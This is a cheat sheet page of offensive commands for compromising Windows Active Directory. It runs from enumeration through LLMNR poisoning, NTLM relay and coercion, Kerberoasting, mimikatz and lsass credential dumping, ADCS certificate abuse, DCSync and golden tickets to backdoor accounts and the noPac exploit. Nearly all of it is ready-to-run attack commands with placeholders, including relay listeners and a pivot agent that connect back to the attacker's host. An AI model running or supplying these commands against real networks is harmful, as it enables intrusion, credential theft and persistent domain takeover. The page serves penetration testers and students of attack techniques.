---
layout: page
title: Active Directory
permalink: /cheatsheets/active-directory/
---

## Network Enumeration & DC Discovery

### Host/network discovery
```bash
arp-scan -l
fping -asgq 172.16.0.0/23
nmap -sn 192.168.0.0/16
sudo nmap -sV -O -iL hosts.txt -oN host-enum.txt
```

### AD-specific port scan
```bash
sudo masscan 192.168.0.0/16 -p 21,22,53,80,88,135,139,389,443,445,464,636,1433,3268,3269,3389,5985,5986
nmap -T4 -p 88,389,464,3268 -Pn 10.10.10.0/24
```

### Find domain controllers
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
nmap -T4 -p 88,389,464,3268 -Pn <RANGE>
```

---

## Unauthenticated Enumeration

### Null session — SMB & RPC
```bash
smbclient -N -L //<IP>
rpcclient -U "" -N <IP>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> getdompwinfo
rpcclient $> queryuser <RID>
```

### LDAP anonymous bind
```bash
ldapsearch -x -H ldap://<IP> -s base -b "" namingContexts
ldapsearch -x -H ldap://<IP> -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=user)" sAMAccountName
```

### Username enumeration with kerbrute
```bash
kerbrute userenum -d <DOMAIN> --dc <IP> users.txt -o valid_users.txt
```

### RID brute-force (null session)
```bash
nxc smb <IP> -u 'guest' -p '' --rid-brute
```

---

## Foothold — Poisoning & Relay

### LLMNR / NBT-NS poisoning (Responder)
```bash
sudo responder -I eth0 -w
sudo responder -I eth0 -d -P
# Crack captured NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Passive analysis mode (no poisoning)
```bash
sudo responder -I <interface> -A
```

### SMB relay (requires hosts without SMB signing)
```bash
# Find targets without signing
nxc smb <RANGE> --gen-relay-list smb_relay_list.txt

# Disable SMB/HTTP in Responder.conf, then:
sudo responder -I eth0
impacket-ntlmrelayx -tf smb_relay_list.txt -smb2support -socks

# Use sessions via proxychains
proxychains4 smbclient //10.10.10.4/C$ -U 'DOMAIN/Administrator' -N
proxychains4 nxc smb 10.10.10.4 -u 'DOMAIN\Administrator' -p '' --sam
proxychains4 nxc smb 10.10.10.4 -u 'DOMAIN\Administrator' -p '' -M lsassy
```

### Authentication coercion
```bash
# Scan for coerceable targets
./Coercer.py scan -u '<USER>' -p '<PASS>' -d <DOMAIN> -t targets.txt

# Coerce to your listener
./Coercer.py coerce -u '<USER>' -p '<PASS>' -d <DOMAIN> -t <TARGET_IP> -l <YOUR_IP>
python PetitPotam.py -u <USER> -p '<PASS>' -dc-ip <DC_IP> -d <DOMAIN> <LISTENER_IP> <TARGET_IP>
nxc smb <DC_IP> -u <USER> -p '<PASS>' -M coerce_plus -o LISTENER=<YOUR_IP> METHOD=PetitPotam
```

### MiTM6 — IPv6 relay to LDAPS
```bash
sudo mitm6 -d <DOMAIN> -i eth0

# Escalate an existing user
sudo impacket-ntlmrelayx --ipv6 -wh wpad -t ldaps://dc-01.<DOMAIN> -smb2support --escalate-user <USER>

# Create a DCSync-capable user
sudo impacket-ntlmrelayx --ipv6 -wh wpad -t ldaps://dc-01.<DOMAIN> -smb2support -l loot
impacket-secretsdump -just-dc-ntlm <DOMAIN>/<CREATED_USER>:'<PASS>'@<DC_FQDN>
```

### NTLMv1 downgrade + silver ticket
```bash
# /etc/responder/Responder.conf → set Challenge = 1122334455667788
sudo responder -I <interface> --lm --disable-ess
hashcat -m 5500 hash.txt rockyou.txt

# Build silver ticket from machine account NT hash
impacket-ticketer -nthash <MACHINE_NTHASH> -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> -spn <SPN> <USER>
export KRB5CCNAME=<USER>.ccache
lsassy -k <TARGET_FQDN>
```

### NTLM relay + RBCD (delegate-access)
```bash
sudo impacket-ntlmrelayx -t ldaps://<DC_FQDN> -smb2support --delegate-access --remove-mic
python PetitPotam.py -u <USER> -p '<PASS>' -dc-ip <DC_IP> -d <DOMAIN> <LISTENER_IP> <TARGET_IP>

impacket-getST -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator \
  <DOMAIN>/'<DELEGATED_MACHINE>$':'<PASS>'
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>
```

---

## Password Spraying

### Get password policy before spraying
```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' --pass-pol
```

### Spray single password
```bash
nxc smb <IP> -u users.txt -p '<CANDIDATE_PASS>' --continue-on-success
```

### Spray with kerbrute (Kerberos, no lockout logging)
```bash
kerbrute passwordspray -d <DOMAIN> --dc <IP> users.txt '<CANDIDATE_PASS>'
```

---

## Authenticated Enumeration

### Users, shares, password policy
```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' --users
nxc smb <IP> -u '<USER>' -p '<PASS>' --shares
nxc smb <IP> -u '<USER>' -p '<PASS>' --pass-pol
```

### Passwords in description fields
```bash
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M user-desc
nxc ldap <IP> -u '<USER>' -p '<PASS>' -M get-desc-users
```

### GPP / cPassword
```bash
nxc smb <IP> -u '<USER>' -p '<PASS>' -M gpp_password
nxc smb <IP> -u '<USER>' -p '<PASS>' -M gpp_autologin
smbclient //<IP>/SYSVOL -U '<DOMAIN>/<USER>%<PASS>' -c 'recurse ON; prompt OFF; mget *'
grep -ri 'cpassword' ./
impacket-Get-GPPPassword LOCAL -xmlfile ./path/to/groups.xml
```

### gMSA password retrieval
```bash
nxc ldap <DC_FQDN> -d <DOMAIN> -u '<USER>' -p '<PASS>' --gmsa
python gMSADumper.py -d "<DOMAIN>" -u "<USER>" -p "<PASS>"
```

### Snaffler (find credentials in shares)
```cmd
runas /netonly /user:<DOMAIN>\<USER> cmd.exe
snaffler.exe -s -o snaffler.log
```

### Drop LNK files on writable shares (capture hashes)
```bash
sudo responder -I eth0
nxc smb <RANGE> -d <DOMAIN> -u '<USER>' -p '<PASS>' -M slinky \
  -o SERVER=<YOUR_IP> NAME='!test'
# Cleanup
nxc smb <RANGE> -d <DOMAIN> -u '<USER>' -p '<PASS>' -M slinky \
  -o SERVER=<YOUR_IP> NAME='!test' CLEANUP=True
```

### PowerShell history
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

---

## BloodHound Collection

### bloodhound-python (NTLM)
```bash
bloodhound-python -d <DOMAIN> -ns <IP> -u '<USER>' -p '<PASS>' -c All
```

### bloodhound-python (Kerberos)
```bash
bloodhound-python -d <DOMAIN> -ns <IP> -u '<USER>' -p '<PASS>' -c All -k
```

### RustHound-CE (faster, LDAP only)
```bash
./rusthound-ce -d <DOMAIN> -u '<USER>' -p '<PASS>' -i <IP> -z -c All
./rusthound-ce -d <DOMAIN> -u '<USER>' -p '<PASS>' -i <IP> -z -c LdapOnly
```

### adPEAS (on target)
```powershell
Import-Module .\adPEAS.ps1
Invoke-adPEAS -Domain "<DOMAIN>" -Username "<USER>" -Password "<PASS>"
```

### BloodHound cypher — find certificate template control
```cypher
MATCH p = (n:Base)-[:Owns|WriteOwner|WriteDacl|GenericAll|GenericWrite]->(m:CertTemplate)
WHERE NOT n.objectid ENDS WITH "-512"
AND NOT n.objectid ENDS WITH "-519"
AND NOT n.objectid ENDS WITH "-544"
RETURN p
```

---

## Kerberos Attacks

### AS-REP Roasting
```bash
# Without creds (pre-auth disabled accounts)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <IP>

# With creds (enumerate all)
impacket-GetNPUsers <DOMAIN>/<USER>:'<PASS>' -dc-ip <IP> -request

# Crack
hashcat -m 18200 hashes.txt rockyou.txt    # etype 23 RC4
hashcat -m 32200 hashes.txt rockyou.txt    # etype 18 AES-256
```

### Kerberoasting
```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <IP> -request

# Crack
hashcat -m 13100 hashes.txt rockyou.txt    # RC4
hashcat -m 19700 hashes.txt rockyou.txt    # AES-256
```

### Request TGT
```bash
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTHASH> -dc-ip <IP>
export KRB5CCNAME=<USER>.ccache
```

---

## Credential Dumping

### Remote — SAM
```bash
nxc smb <IP> -u <USER> -p '<PASS>' --local-auth --sam
```

### Remote — LSASS
```bash
lsassy <IP> -u <USER> -p '<PASS>'
nxc smb <IP> -u <USER> -p '<PASS>' --local-auth -M lsassy
nxc smb <IP> -u <USER> -p '<PASS>' --local-auth -M nanodump
```

### Remote — DPAPI
```bash
nxc smb <IP> -u <USER> -p '<PASS>' --local-auth --dpapi cookies
nxc smb <IP> -u <USER> -p '<PASS>' --local-auth --dpapi nosystem
```

### Local — mimikatz
```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

### Local — lsass dump + offline parse
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```bash
pypykatz lsa minidump lsass.dmp
```

### Local SAM from registry hives
```cmd
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
```
```bash
impacket-secretsdump -sam sam -system system local
```

### Hunt for creds on the filesystem
```cmd
LaZagne.exe all
```

### Disable UAC remote token filtering
```cmd
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

---

## ACL Abuse (bloodyAD)

### GenericAll — reset password or add to group
```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  set password <TARGET_USER> '<NEW_PASS>'
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  add groupMember 'Domain Admins' <USER>
```

### WriteDACL — grant GenericAll or DCSync rights
```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  add genericAll <TARGET> <USER>
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  add dcsync <USER>
```

### WriteOwner — take ownership then grant rights
```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  set owner <TARGET> <USER>
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  add genericAll <TARGET> <USER>
```

---

## Delegation Attacks

### Find delegation configurations
```bash
# Unconstrained
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  get search --filter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  --attr sAMAccountName,userAccountControl

# Constrained
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  get search --filter "(msDS-AllowedToDelegateTo=*)"
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  get object <MACHINE>$ --attr msDS-AllowedToDelegateTo,userAccountControl
```

### Unconstrained delegation — capture TGT
```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
kerberos::ptt <CAPTURED_TICKET>.kirbi
```
```bash
impacket-ticketConverter Administrator@krbtgt-<DOMAIN>.kirbi administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
```

### Constrained delegation — S4U2Proxy
```bash
impacket-getST -spn '<SPN>/<TARGET_FQDN>' -impersonate Administrator \
  <DOMAIN>/'<SERVICE_ACCOUNT>$':'<PASS>'
impacket-getST -spn '<SPN>/<TARGET_FQDN>' -impersonate Administrator \
  -hashes :<NTHASH> '<DOMAIN>/<SERVICE_ACCOUNT>$'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>
```

### RBCD — create computer, configure, impersonate
```bash
# Add attacker computer account
addcomputer.py -computer-name 'ATTACKERPC$' -computer-pass '<PASS>' \
  <DOMAIN>/<USER>:'<PASS>'

# Grant RBCD to target
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -p '<PASS>' \
  add rbcd '<TARGET_MACHINE>$' 'ATTACKERPC$'

# Request service ticket
impacket-getST -spn 'cifs/<TARGET_FQDN>' -impersonate Administrator \
  <DOMAIN>/'ATTACKERPC$':'<PASS>'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>
```

### RBCD via impacket-rbcd (existing write privilege)
```bash
impacket-rbcd -delegate-to '<TARGET_MACHINE>$' -delegate-from '<ATTACKER_MACHINE>$' \
  -dc-ip <IP> -action write '<DOMAIN>/<USER>:<PASS>'
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -dc-ip <IP> '<DOMAIN>/<ATTACKER_MACHINE>$:<PASS>'
```

---

## ADCS — Certificate Attacks (Certipy)

### Enumerate vulnerable templates
```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <IP> -vulnerable -stdout
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <IP> -vulnerable -enabled
```

### ESC1 — request cert with arbitrary UPN
```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE>' \
  -target '<CA_SERVER>' -upn 'administrator@<DOMAIN>'

certipy auth -pfx administrator.pfx -dc-ip <IP> -domain <DOMAIN>
```

### ESC4 — write vulnerable template to default config
```bash
certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <IP> \
  -template '<TEMPLATE>' -write-default-configuration

certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE>' \
  -target '<CA_SERVER>' -upn 'Administrator@<DOMAIN>'

# Restore template
certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <IP> \
  -template '<TEMPLATE>' -write-configuration <TEMPLATE>.json
```

### ESC8 — relay DC auth to CA HTTP endpoint (SMB)
```bash
certipy relay -target 'http://<CA_IP>' -template DomainController

# Trigger coercion in another terminal
nxc smb <DC_IP> -u <USER> -p '<PASS>' -M coerce_plus -o LISTENER=<YOUR_IP>

certipy auth -pfx dc-01.pfx -dc-ip <IP> -domain <DOMAIN>
impacket-secretsdump -just-dc-user administrator \
  -hashes :"<DC_NTHASH>" "<DOMAIN>/<DC_MACHINE>$"@"<DC_IP>"
```

### ESC8 — Kerberos relay (krbrelayx, when NTLM disabled)
```bash
# Add DNS record pointing to your IP
python dnstool.py -u '<DOMAIN>\<USER>' -p '<PASS>' \
  -r "<FAKE_HOSTNAME>" -d "<YOUR_IP>" --action add "<DC_IP>" --tcp

python krbrelayx.py -t 'http://<CA_FQDN>/certsrv/certfnsh.asp' \
  --adcs --template DomainController

./Coercer.py coerce -u <USER> -p '<PASS>' -d <DOMAIN> \
  -t <DC_IP> -l '<FAKE_HOSTNAME>'

certipy auth -pfx dc-01.pfx -dc-ip <IP> -domain <DOMAIN>
```

### ESC16 — modify UPN of service account for impersonation
```bash
# Set service account UPN to administrator
certipy account -u '<USER>@<DOMAIN>' -p '<PASS>' -user <SVC_ACCOUNT> \
  -upn administrator update -ns <IP> -target <IP>

# Request cert (will be issued as administrator)
certipy req -k -target <DC_FQDN> -dc-host <DC_FQDN> -ns <IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE>'

# Restore UPN
certipy account -u '<USER>@<DOMAIN>' -p '<PASS>' -user <SVC_ACCOUNT> \
  -upn '<SVC_ACCOUNT>@<DOMAIN>' update -ns <IP> -target <IP>

certipy auth -pfx administrator.pfx -dc-ip <IP>
```

### Shadow Credentials — add key credential to account
```bash
certipy shadow auto -u '<USER>@<DOMAIN>' -p '<PASS>' \
  -account <TARGET_USER> -ns <IP> -target <IP>
certipy auth -pfx <TARGET_USER>.pfx -dc-ip <IP> -domain <DOMAIN>
```

### Certifried (CVE-2022-26923) — machine cert impersonation
```bash
# Create a computer account with DC's DNS name
certipy account create -u '<USER>@<DOMAIN>' -p '<PASS>' \
  -user 'CompTest$' -pass '<COMP_PASS>' -dns '<DC_FQDN>'

# Request Machine template cert
certipy req -u 'CompTest$@<DOMAIN>' -p '<COMP_PASS>' -dc-ip <IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template 'Machine'

certipy auth -pfx dc-01.pfx -dc-ip <IP> -domain <DOMAIN>
impacket-secretsdump -hashes :"<DC_NTHASH>" "<DOMAIN>/<DC>$"@"<DC_IP>"
```

---

## DCSync & NTDS Dump

### DCSync — all hashes
```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<DC_IP>
impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NTHASH>
impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:'<PASS>'@<DC_IP>
```

### DCSync — Kerberos (NTLM disabled)
```bash
KRB5CCNAME=<DC>.ccache impacket-secretsdump <DC_FQDN> -dc-ip <IP> -k
```

### Offline NTDS.dit parsing
```bash
impacket-secretsdump -system SYSTEM -ntds NTDS.dit LOCAL
```

---

## Pass-the-Hash / Pass-the-Ticket

### PTH — multiple tools
```bash
impacket-psexec -hashes :<NTHASH> <DOMAIN>/<USER>@<IP>
impacket-wmiexec -hashes :<NTHASH> <DOMAIN>/<USER>@<IP>
evil-winrm -i <IP> -u <USER> -H <NTHASH>
nxc smb <IP> -d <DOMAIN> -u <USER> -H '<NTHASH>'
nxc winrm <IP> -d <DOMAIN> -u <USER> -H '<NTHASH>'
```

### PTT — inject ticket (Windows)
```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

### Overpass-the-Hash (Windows)
```cmd
Rubeus.exe asktgt /user:<USER> /rc4:<NTHASH> /ptt
klist
```

---

## Lateral Movement

### Remote execution
```bash
impacket-psexec <DOMAIN>/<USER>:'<PASS>'@<IP>
impacket-smbexec <DOMAIN>/<USER>:'<PASS>'@<IP>
impacket-wmiexec <DOMAIN>/<USER>:'<PASS>'@<IP>
evil-winrm -i <IP> -u <USER> -p '<PASS>'
evil-winrm -i <IP> -u <USER> -H <NTHASH>
```

### RDP
```bash
nxc rdp <IP> -u '<USER>' -p '<PASS>' -d <DOMAIN>
xfreerdp /v:<IP> /u:'<USER>' /p:'<PASS>' /d:<DOMAIN> /cert:ignore
```

### Spray local admin across all hosts
```bash
nxc smb targets.txt -u Administrator -p '<PASS>' --local-auth
nxc smb targets.txt -u Administrator -H <NTHASH> --local-auth
```

### SSH tunneling (pivot)
```bash
# Port forward
ssh -L 8080:<INTERNAL_IP>:80 <USER>@<PIVOT_IP>

# Dynamic SOCKS proxy
ssh -N -D 127.0.0.1:1080 <USER>@<PIVOT_IP>
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains curl http://<INTERNAL_IP>
```

### Ligolo-ng (pivot)
```bash
# Attacker
sudo ./proxy -selfcert

# Target
.\agent.exe -connect <YOUR_IP>:11601 -ignore-cert

# Proxy console
session
start
autoroute
```

---

## Kerberos Ticket Attacks

### Golden Ticket
```bash
# Dump krbtgt hash + domain SID
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-user krbtgt
impacket-lookupsid <DOMAIN>/<USER>:'<PASS>'@<DC_IP>

# Forge golden ticket
impacket-ticketer -aesKey '<KRBTGT_AES256>' -domain-sid '<DOMAIN_SID>' \
  -domain '<DOMAIN>' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
nxc smb <DC_FQDN> -u Administrator --use-kcache -x 'whoami'
```

### Silver Ticket
```bash
impacket-ticketer -aesKey '<SERVICE_AES256>' -domain-sid '<DOMAIN_SID>' \
  -domain '<DOMAIN>' -spn 'cifs/<FQDN>' Administrator
impacket-ticketer -nthash '<SERVICE_NTHASH>' -domain-sid '<DOMAIN_SID>' \
  -domain '<DOMAIN>' -spn 'cifs/<FQDN>' Administrator
```

### Diamond Ticket (Windows)
```cmd
runas /user:<DOMAIN>\<USER> powershell
.\Rubeus.exe diamond /tgtdeleg /krbkey:<KRBTGT_KEY> /ticketuser:Administrator /domain:<DOMAIN> /ptt /nowrap
```

### Diamond Ticket (Linux conversion)
```bash
echo '<BASE64_BLOB>' | base64 -d > admin.kirbi
impacket-ticketConverter admin.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
impacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
```

---

## Persistence

### Create a backdoor domain user
```bash
nxc smb <DC_IP> -u <ADMIN> -p '<PASS>' -d <DOMAIN> \
  -X 'New-ADUser -Name "John Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@<DOMAIN>" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true'
```

### Add to privileged groups
```powershell
Add-ADGroupMember "Domain Admins" -Members "<USER>"
net group "Enterprise Admins" <USER> /add /domain
```

---

## Domain Trusts

### Enumerate trusts
```powershell
Get-DomainTrust -Domain <DOMAIN>
Get-DomainTrustMapping
Get-ForestTrust
Get-ForestDomain
```
```cmd
nltest /domain_trusts /all_trusts /v
nltest /dsgetdc:<DOMAIN> /force
```

---

## CVE Scanning

### Scan with Nmap vuln scripts
```bash
nmap -T4 --script "safe and vuln" -sV --open <RANGE>
nmap -T4 -p 445,135,139 --script smb-vuln-ms17-010,smb-protocols,smb-security-mode -sV --open <RANGE>
```

### noPac (CVE-2021-42278 / CVE-2021-42287)
```bash
sudo python3 scanner.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <IP> -use-ldap
sudo python3 noPac.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <IP> -dc-host <DC_HOSTNAME> \
  --impersonate administrator -use-ldap -shell
```
